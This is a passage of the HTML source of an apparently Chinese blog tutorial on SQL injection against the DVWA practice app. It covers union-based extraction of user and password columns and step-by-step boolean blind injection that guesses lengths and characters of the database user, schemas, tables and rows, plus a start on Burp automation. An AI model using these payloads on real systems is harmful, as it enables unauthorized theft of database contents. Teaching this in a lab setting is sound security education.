+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/9_hu4f14de66aacc12e0af72d6951c01f38c_14572_480x0_resize_q75_box.jpg 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/9_hu4f14de66aacc12e0af72d6951c01f38c_14572_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="小猫咪坏心眼可多了"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="100"
+		data-flex-basis="240px"
+	
+></p>
+<p>接下来就是查询users表中所有的列</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="w"> </span><span class="mi">1</span><span class="s1">&#39;and 1=2 union select 2,column_name from information_schema.columns where table_schema= &#39;</span><span class="n">dvwa</span><span class="s1">&#39; and table_name= &#39;</span><span class="n">users</span><span class="s1">&#39;#
+</span></code></pre></div><p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-16.png"
+	width="1237"
+	height="555"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-16_hube2672f1fec28615ffc8484a15975849_120547_480x0_resize_box_3.png 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-16_hube2672f1fec28615ffc8484a15975849_120547_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="列名!找到你了!喵哈哈哈哈"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="222"
+		data-flex-basis="534px"
+	
+></p>
+<p>最后，就可以拿到<del>小猫咪</del>攻击者想要的数据了</p>
+<blockquote>
+<p>啧啧啧，谁家的小猫咪这么坏</p>
+<p><del>啊，不好! 喵星的机密暴露了</del></p>
+</blockquote>
+<p><strong>咳咳咳，不皮了</strong></p>
+<p>查询user和password两列的信息</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="w"> </span><span class="mi">1</span><span class="s1">&#39;and 1=2 union select user,password from dvwa.users#
+</span></code></pre></div><p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-22.png"
+	width="668"
+	height="362"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-22_hu3a3f16b76b944507c21c7fef79b8a833_69883_480x0_resize_box_3.png 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-22_hu3a3f16b76b944507c21c7fef79b8a833_69883_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="猫猫:脱库了，你数据没了。寄"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="184"
+		data-flex-basis="442px"
+	
+></p>
+<h3 id="布尔型盲注">布尔型盲注</h3>
+<blockquote>
+<p>为什么叫做<strong>布尔</strong>型盲注?</p>
+<p>&ndash;因为只提示是或者否</p>
+</blockquote>
+<p>保持DVWA<code>low</code>的安全级别, 去到 <code>SQL Injection (Blind)</code>页面</p>
+<h4 id="尝试显注中的方法">尝试显注中的方法</h4>
+<p>寄.</p>
+<p>输入单引号不会报错了，仅仅提示用户名不在数据库中</p>
+<p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-37.png"
+	width="855"
+	height="192"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-37_hu8be5c81652a6291cbb8e40f6dfabeb6a_16798_480x0_resize_box_3.png 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-37_hu8be5c81652a6291cbb8e40f6dfabeb6a_16798_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="User ID is MISSING from the database."
+	
+	
+		class="gallery-image" 
+		data-flex-grow="445"
+		data-flex-basis="1068px"
+	
+></p>
+<h4 id="思考新方法">思考新方法</h4>
+<p>如果把通过SQL注入查询数据库中内容比作问一个人问题，</p>
+<p>显注就是问他什么这个人都直接回答，</p>
+<p>布尔型盲注就是你只能问这个人xxx是不是这个问题的答案，他只会回答是或者否</p>
+<p>所以面对布尔型注入，我们需要&hellip;</p>
+<p>一个一个尝试</p>
+<ul>
+<li>
+<p>库(表，列，数据)的数量,</p>
+</li>
+<li>
+<p>库名(表名，列名，数据)的长度,</p>
+</li>
+<li>
+<p>库名(表名，列名，数据)每个字母</p>
+</li>
+</ul>
+<p>不得不说，这种情况手工真的是太费劲了=  =</p>
+<blockquote>
+<p>某暴躁的脚本小猫: 哪那么多事？！直接sqlmap一把梭</p>
+</blockquote>
+<p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/33.jpg"
+	width="300"
+	height="300"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/33_hu2395aa55ed700d0528bef5dcdb8fb2cb_8576_480x0_resize_q75_box.jpg 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/33_hu2395aa55ed700d0528bef5dcdb8fb2cb_8576_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="100"
+		data-flex-basis="240px"
+	
+></p>
+<h4 id="检测注入点-1">检测注入点</h4>
+<p>我们分别在输入框中输入<code>1</code>,<code>1' and 1=1#</code>,<code>1' and 1=2#</code></p>
+<p>如果payload被带进数据库执行并产生歧义的话，<code>1</code>和<code>1' and 1=1#</code></p>
+<p>返回的结果应该是一样的，而和<code>1' and 1=2#</code>的结果不一样</p>
+<p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-07.png"
+	width="337"
+	height="105"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-07_hu30b5c44374dac67f26c643f7c3f21c2c_6297_480x0_resize_box_3.png 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-07_hu30b5c44374dac67f26c643f7c3f21c2c_6297_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="320"
+		data-flex-basis="770px"
+	
+></p>
+<p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-06.png"
+	width="340"
+	height="96"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-06_hufe212a83c079b2d0ca573e12d224fa42_7274_480x0_resize_box_3.png 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-06_hufe212a83c079b2d0ca573e12d224fa42_7274_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="354"
+		data-flex-basis="850px"
+	
+></p>
+<p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-08.png"
+	width="397"
+	height="106"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-08_huc7a751cc354fe2d6366998ac922c121a_8420_480x0_resize_box_3.png 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-08_huc7a751cc354fe2d6366998ac922c121a_8420_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="374"
+		data-flex-basis="898px"
+	
+></p>
+<p>所以得出结论，该处存在SQL注入漏洞</p>
+<h4 id="获取数据">获取数据</h4>
+<p>还是按照显注的思路一层一层获取数据，不过多了猜解的过程</p>
+<p>我们先来通过<code>user()</code>函数获取数据库用户名</p>
+<p>由于我们需要一个一个字符猜(<code>substring()</code>)，我们先得知道用户名的总长度(<code>length()</code>)</p>
+<p>这个猜的范围有亿点点大啊&hellip;</p>
+<h5 id="二分法偷懒">二分法偷懒</h5>
+<p>没关系，我们可以把大范围通过二分法缩小，这样就能减少工作量了</p>
+<p><del>(也就是偷个小懒)</del></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="w"> </span><span class="mi">1</span><span class="s1">&#39; and length(user())&gt;5#
+</span></code></pre></div><p>输入上面的语句返回<code>User ID exists in the database</code></p>
+<p>说明用户名的长度是大于5的</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="w"> </span><span class="mi">1</span><span class="s1">&#39; and length(user())&gt;20#
+</span></code></pre></div><p>同理，输入上面的语句返回<code>User ID is MISSING from the database</code>说明用户名的长度是小于20的</p>
+<p>通过这样的方法，我们很快就能找到用户名的长度是14</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="w"> </span><span class="mi">1</span><span class="s1">&#39; and length(user())=14#
+</span></code></pre></div><p>接下来就要猜每一个字母了</p>
+<p>我们可以利用字符ASCII值的大小进行二分</p>
+<p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/ascii.jpg"
+	width="653"
+	height="709"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/ascii_hu44c394602663647c9d20badf981d2d72_319214_480x0_resize_q75_box.jpg 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/ascii_hu44c394602663647c9d20badf981d2d72_319214_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="ASCII表"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="92"
+		data-flex-basis="221px"
+	
+></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="mi">1</span><span class="s1">&#39; and substring(user(),1,1)&gt;&#39;</span><span class="n">a</span><span class="s1">&#39;#
+</span><span class="s1">1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">substring</span><span class="p">(</span><span class="k">user</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="s1">&#39;z&#39;</span><span class="o">#</span><span class="w">
+</span></code></pre></div><p>可见，用户名第一个字母是在小写a到小写z之间的</p>
+<p>接着就一个一个猜字母吧QwQ</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="mi">1</span><span class="s1">&#39; and substring(user(),1,1)=&#39;</span><span class="n">r</span><span class="s1">&#39;#
+</span><span class="s1">1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">substring</span><span class="p">(</span><span class="k">user</span><span class="p">(),</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;o&#39;</span><span class="o">#</span><span class="w">
+</span><span class="w"></span><span class="mi">1</span><span class="s1">&#39; and substring(user(),3,1)=&#39;</span><span class="n">o</span><span class="s1">&#39;#
+</span><span class="s1">1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">substring</span><span class="p">(</span><span class="k">user</span><span class="p">(),</span><span class="mi">4</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;t&#39;</span><span class="o">#</span><span class="w">
+</span><span class="w"></span><span class="mi">1</span><span class="s1">&#39; and substring(user(),5,1)=&#39;</span><span class="o">@</span><span class="s1">&#39;#
+</span><span class="s1">1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">substring</span><span class="p">(</span><span class="k">user</span><span class="p">(),</span><span class="mi">6</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;l&#39;</span><span class="o">#</span><span class="w">
+</span><span class="w"></span><span class="mi">1</span><span class="s1">&#39; and substring(user(),7,1)=&#39;</span><span class="n">o</span><span class="s1">&#39;#
+</span><span class="s1">1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">substring</span><span class="p">(</span><span class="k">user</span><span class="p">(),</span><span class="mi">8</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;c&#39;</span><span class="o">#</span><span class="w">
+</span><span class="w"></span><span class="mi">1</span><span class="s1">&#39; and substring(user(),9,1)=&#39;</span><span class="n">a</span><span class="s1">&#39;#
+</span><span class="s1">1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">substring</span><span class="p">(</span><span class="k">user</span><span class="p">(),</span><span class="mi">10</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;l&#39;</span><span class="o">#</span><span class="w">
+</span><span class="w"></span><span class="mi">1</span><span class="s1">&#39; and substring(user(),11,1)=&#39;</span><span class="n">h</span><span class="s1">&#39;#
+</span><span class="s1">1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">substring</span><span class="p">(</span><span class="k">user</span><span class="p">(),</span><span class="mi">12</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;o&#39;</span><span class="o">#</span><span class="w">
+</span><span class="w"></span><span class="mi">1</span><span class="s1">&#39; and substring(user(),13,1)=&#39;</span><span class="n">s</span><span class="s1">&#39;#
+</span><span class="s1">1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">substring</span><span class="p">(</span><span class="k">user</span><span class="p">(),</span><span class="mi">14</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;t&#39;</span><span class="o">#</span><span class="w">
+</span></code></pre></div><p>最后，我们推出用户名是<code>root@localhost</code></p>
+<p>同理，其他几个函数也是如此操作，这里不过多赘述</p>
+<h5 id="层层推进">层层推进</h5>
+<p>接下来就是库名了，这里要注意比前面的推测内置函数结果的多一个步骤</p>
+<p>就是猜数据库的数量</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="w"> </span><span class="mi">1</span><span class="s1">&#39; and (select count(schema_name) from information_schema.schemata) =6 #
+</span></code></pre></div><p>然后就是常规操作，上就是了(</p>
+<p>注入第一个库名长度</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="w"> </span><span class="mi">1</span><span class="s1">&#39; and length((select schema_name from information_schema.schemata limit 0,1))=18 #
+</span></code></pre></div><blockquote>
+<p>小Tip:</p>
+<p>limit 0,1代表截取第一行。</p>
+<p>limit 0,2代表截取前两行，limit 1,1，代表截取第二行。</p>
+<p>limit 2,3代表截取从第三行到第五行。</p>
+</blockquote>
+<p>然后注入第一个库名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="mi">1</span><span class="s1">&#39; and substring((select schema_name from information_schema.schemata limit 0,1),1,1)=&#39;</span><span class="n">i</span><span class="s1">&#39; #
+</span><span class="s1">1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">substring</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">schema_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;n&#39;</span><span class="w"> </span><span class="o">#</span><span class="w">
+</span><span class="w"></span><span class="p">...</span><span class="w">
+</span><span class="w"></span><span class="p">...</span><span class="w">
+</span><span class="w"></span><span class="p">...</span><span class="w">
+</span></code></pre></div><p>注入其他库名把limit后面的东西改掉了好了，不写了= =</p>
+<p>注入表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="mi">1</span><span class="s1">&#39; and (select count(table_name) from information_schema.tables where table_schema=&#39;</span><span class="n">dvwa</span><span class="s1">&#39;)=2 #
+</span><span class="s1">1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">length</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;dvwa&#39;</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">9</span><span class="w"> </span><span class="o">#</span><span class="w">
+</span><span class="w"></span><span class="mi">1</span><span class="s1">&#39; and (substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=&#39;</span><span class="k">g</span><span class="s1">&#39; # 
+</span><span class="s1">1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="s1">&#39;u&#39;</span><span class="w"> </span><span class="o">#</span><span class="w">
+</span><span class="w"></span><span class="mi">1</span><span class="s1">&#39; and (substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1))=&#39;</span><span class="n">e</span><span class="s1">&#39; #
+</span><span class="s1">...
+</span><span class="s1">...
+</span><span class="s1">...
+</span></code></pre></div><p>注入列名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="mi">1</span><span class="s1">&#39; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;</span><span class="n">users</span><span class="s1">&#39;)=8 #
+</span><span class="s1">1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">length</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;dvwa&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;users&#39;</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">7</span><span class="o">#</span><span class="w">
+</span><span class="w"></span><span class="mi">1</span><span class="s1">&#39; and length((select column_name from information_schema.columns where table_schema= &#39;</span><span class="n">dvwa</span><span class="s1">&#39; and table_name= &#39;</span><span class="n">users</span><span class="s1">&#39; limit 3,1))=4#
+</span><span class="s1">1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">length</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;dvwa&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;users&#39;</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">8</span><span class="o">#</span><span class="w">
+</span><span class="w"></span><span class="mi">1</span><span class="s1">&#39; and (substr((select column_name from information_schema.columns where table_schema= &#39;</span><span class="n">dvwa</span><span class="s1">&#39; and table_name= &#39;</span><span class="n">users</span><span class="s1">&#39; limit 3,1),1,1))=&#39;</span><span class="n">u</span><span class="s1">&#39;#
+</span><span class="s1">1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;dvwa&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;users&#39;</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="s1">&#39;s&#39;</span><span class="o">#</span><span class="w">
+</span><span class="w"></span><span class="mi">1</span><span class="s1">&#39; and (substr((select column_name from information_schema.columns where table_schema= &#39;</span><span class="n">dvwa</span><span class="s1">&#39; and table_name= &#39;</span><span class="n">users</span><span class="s1">&#39; limit 3,1),3,1))=&#39;</span><span class="n">e</span><span class="s1">&#39;#
+</span><span class="s1">1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;dvwa&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;users&#39;</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">4</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="s1">&#39;r&#39;</span><span class="o">#</span><span class="w">
+</span></code></pre></div><p>最后就是看数据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="mi">1</span><span class="s1">&#39; and (select count(*) from dvwa.users)=5#
+</span><span class="s1">1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">length</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">5</span><span class="o">#</span><span class="w">
+</span><span class="w"></span><span class="mi">1</span><span class="s1">&#39; and substr((select user from users limit 0,1),1,1)=&#39;</span><span class="n">a</span><span class="s1">&#39; #
+</span><span class="s1">...
+</span><span class="s1">...
+</span><span class="s1">...
+</span></code></pre></div><h4 id="通过burp自动化">通过Burp自动化</h4>
+<p>不得不说，即使是二分法工作量依然很巨</p>
+<p>实际上，其中很多遍历工作可以交给Burp自动完成</p>
+<p>比如说，我想要看到users表user列中的第一个数据.</p>
+<p>我们可以先随便写一个payload,</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="w"> </span><span class="mi">1</span><span class="s1">&#39; and substr((select user from users limit 0,1),1,1)=&#39;</span><span class="n">a</span><span class="s1">&#39;#
+</span></code></pre></div><p>然后Burp抓包</p>
+<p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-22.png"
+	width="1155"
+	height="734"
